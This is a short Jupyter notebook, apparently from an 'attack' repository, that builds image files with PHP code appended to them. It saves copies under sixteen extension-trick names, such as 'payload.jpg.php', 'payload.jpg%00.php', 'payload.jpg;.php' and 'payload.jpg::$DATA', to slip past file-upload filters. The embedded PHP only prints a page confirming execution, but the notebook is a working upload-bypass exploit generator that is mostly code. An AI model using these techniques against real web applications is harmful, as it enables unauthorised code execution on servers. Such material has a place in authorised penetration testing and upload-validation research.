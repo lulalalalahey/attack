{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "✅ 共生成 16 个伪装文件，保存至：bypass_upload_payloads/\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "php_payload = '''\n",
    "<?php\n",
    "echo \"<!DOCTYPE html><html><head><style>\n",
    "body { background-color: black; color: #00ff00; font-size: 24px; text-align: center; padding-top: 50px; }\n",
    "</style></head><body>\";\n",
    "echo \"<h1>✅ PHP Payload Executed</h1>\";\n",
    "echo \"<p><strong>Server Time:</strong> \" . date(\"Y-m-d H:i:s\") . \"</p>\";\n",
    "echo \"<p>If you see this, PHP was parsed successfully!</p>\";\n",
    "echo \"</body></html>\";\n",
    "?>\n",
    "'''\n",
    "source_img = \"../../image.png\"  # 确保这是一张真实图\n",
    "output_dir = \"bypass_upload_payloads\"\n",
    "os.makedirs(output_dir, exist_ok=True)\n",
    "\n",
    "# 多种伪装扩展名组合\n",
    "filenames = [\n",
    "    \"payload.jpg\", \"payload.jpeg\", \"payload.png\", \"payload.webp\",\n",
    "    \"payload.jpg.php\", \"payload.png.php\", \"payload.jpeg.phtml\", \"payload.webp.pHp\",\n",
    "    \"payload.jpg;.php\", \"payload.jpg%00.php\", \"payload.php.jpg\", \"payload.php.jpeg\",\n",
    "    \"payload.php.webp\", \"payload.php%20.jpg\", \"payload.php .jpg\",\n",
    "    \"payload.jpg::$DATA\"\n",
    "]\n",
    "\n",
    "# 生成文件：原图 + 尾部 payload\n",
    "with open(source_img, \"rb\") as f:\n",
    "    image_data = f.read()\n",
    "\n",
    "for name in filenames:\n",
    "    with open(os.path.join(output_dir, name), \"wb\") as f:\n",
    "        f.write(image_data + php_payload.encode())\n",
    "\n",
    "print(f\"✅ 共生成 {len(filenames)} 个伪装文件，保存至：{output_dir}/\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting piexif\n",
      "  Downloading piexif-1.1.3-py2.py3-none-any.whl.metadata (3.7 kB)\n",
      "Downloading piexif-1.1.3-py2.py3-none-any.whl (20 kB)\n",
      "Installing collected packages: piexif\n",
      "Successfully installed piexif-1.1.3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: Ignoring invalid distribution -atplotlib (d:\\anaconda\\download\\envs\\ex\\lib\\site-packages)\n",
      "WARNING: Ignoring invalid distribution -atplotlib (d:\\anaconda\\download\\envs\\ex\\lib\\site-packages)\n",
      "WARNING: Ignoring invalid distribution -atplotlib (d:\\anaconda\\download\\envs\\ex\\lib\\site-packages)\n"
     ]
    }
   ],
   "source": [
    "!pip install piexif"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "ex",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.19"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
